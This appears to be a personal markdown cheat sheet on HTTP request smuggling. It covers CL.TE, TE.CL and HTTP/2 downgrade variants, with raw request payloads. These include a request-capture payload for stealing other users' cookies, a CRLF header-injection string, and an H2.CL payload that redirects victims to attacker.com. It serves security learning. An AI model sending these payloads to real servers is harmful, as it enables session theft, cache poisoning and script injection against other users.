# HTTP Request Smuggling

## Response Queue Poisening
When you smuggle an extra full request, it can cause the server's response queue to get poisened. This is exploitable if the connection between the front-end and back-end is used for more than a few requests, and the attack does not cause the connection to shut down. When the queue is poisened, every request will recieve the response from the previous request. This allows an attacker to recieve perhaps sensitive responses from other users that allow for full account takeover. Also it makes the website kinda unusable for other users since they get weird responses not corresponing to their request.

## Harmless -> Exploitable
### On-Site Redirect -> Open Redirect
Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash. This behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. Example [PoC](#h2cl--on-site-redirect)

# HTTP/1.1
Requests first go through a load balancer/reverse proxy/front end, and then get sent to a back end server. If there are inconsistencies between the calculation of the length of the requests, it allows for HTTP request smuggling.

![Request smuggling schematic](../images/Request_smuggling.png)

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header. Sometimes, front-end and back-end prioritize or don't support one or the other. This can cause the vulnerability.

With `Transfer-Encoding: chunked`, each chunk of data looks like this:
```
| size (Bytes in hex) | newline | data |
```
The message is terminated with a chunk of size zero, so something like this `0\r\n\r\n`.

> HTTP/2 is kinda immune to ambigious request length

## Exploitation

### Front-End Headers
Most likely, the front end will add some extra headers to the request it gets to forward some extra information like ids, encryption method, user ip, etc. to the back-end. But when you smuggle a basic HTTP request, it does not have these headers when it arrives at the back-end. So this might cause it to be handled differently and fail. 

To find out how a back-end request looks like, just smuggle a `POST` request that reflects (or stores) input it gets. Now when you send another normal request, it gets parsed by the front-end, and then used as input in the smuggled request. The smuggled request reflects its input (the parsed normal request), so you can see what headers the front-end adds. This also works with capturing requests from other users and capturing their session cookies and stuff (only if data is stored). [PoC](#get-full-request--clte)

### Combine with XSS
If there is some reflected xss vulnerability, you can combine it with request smuggling. This makes it so that the victim does not have to interact with a sketchy link you send them, and the attacker can control headers that normally cannot be trivially controlled.

### Web Cache
You can use HTTP request smuggling to do web cache poisening or web cache deception. This is so cool like fr. Set up a payload in a way that the front-end server sees it as a static cachable file, and the back-end sees it as a malicious or sensitive file. Now the back-end will send the malicious/sensitive file to the front-end, this server caches the response. So the attacker succesfully poisened/decepted the cache. It might be tedious to have the victim send the right request at the right time to the right front-end server. But when you have a proof of concept, it is easy for an attacker to automate this process using scripting.

## Proof of Concepts
Proof of concepts can differ very much depending on the target server, and the goal of the hack. It requires some creativity and understanding of how things work to forge a nice payload.

### CL.TE | Test
This HTTP request will cause time delay, if vulnerability is present
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
a
0


```

### TE.CL | Test
This HTTP request will cause time delay, if vulnerability is present
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 6
Transfer-Encoding: chunked

0

X
```

### Get Full Request | CL.TE
Reflect/store the request and extra headers given by the front-end into the response of the smuggled request.
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 132
Transfer-Encoding: chunked

0

POST /reflect HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=
```

# HTTP/2
Some amazing research on HTTP/2 vulnerabilities [here](https://portswigger.net/research/http2) by James Kettle, definitely recommended to read (~35 minutes). 

Sometimes the server supports HTTP/2, but does not declare this to the client (due to misconfiguration). The client will simply use HTTP/1.1 as a fallback option. You can discover whole new attack surface if you send all kinds of HTTP/2 requests, and see if it is supported.


## HTTP/2 Downgrading Vulnerabilities
Most of the HTTP/2 vulnerabilities happen because of HTTP/2 downgrading to HTTP/1.1 to the back-end. The front-end server converts the received request to a valid HTTP/1.1 request for the back-end. This is widely used, but can cause vulnerabilities if not correctly implemented with the right precautions.

### Prohibited Injection Sequences | Pseudo-Headers
These are prohibited by the HTTP/2 protocol, meaning that the request should be terminated if encountered (not always, sometimes should just sanitize). But sometimes this check is not (well) implemented.
```
foo: bar\r\nTransfer-Encoding: chunked\r\nX:	ignore
```
Sending a `Host` header will sometimes result in two host headers in the back-end, since in HTTP/2 you got the `:authority` pseudo-header which effectively replaces the normal host header.

Sending two `:path` pseudo-headers might cause inconsistencies concerning which path is used for access control, and which for routing. This might allow you to access off limit endpoints.

If spaces are allowed in the `:method` pseudo-header, you can inject something like this "GET /admin HTTP/1.1". If the back-end ignores trailing character on this first line, this creates an ambiguous path.

If the server dynamically generates a URL using the `:scheme` pseudo-header, you can try injecting it with "https://attacker.com/?" to reroute to a malicious website.

Make sure that the resulting request for the back-end is still valid. It must contain `<method> + space + <path> + space + HTTP/1.1` before the first `\r\n`. Add the correct values accordingly.

### H2.CL
When the front-end blindly uses the received `Content-Length` header in the converted HTTP/1.1 request. Because this header is not used in HTTP/2. Look at this example [PoC](#h2cl--on-site-redirect) using an on-site redirect as an open redirect.

### H2.TE
Normally a front-end server that supports HTTP/2 should terminate any request that contains the `Transfer-Encoding` header. But when this is not properly done, it allows for an attack to exploit request smuggling.


## Proof of Concepts

### H2.CL | On-Site Redirect
This makes use of the feature that a request to `/resources` gets redirected to `<Host>/resources/` ([on-site redirect](#on-site-redirect)). So the next request that gets sent will receive `attacker.com/resources/` as its response. Can cause arbitrary javascript execution if that next request is for a (trusted) javascript file.
```
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

GET /resources HTTP/1.1
Host: attacker.com
Content-Length: 10

x=x
```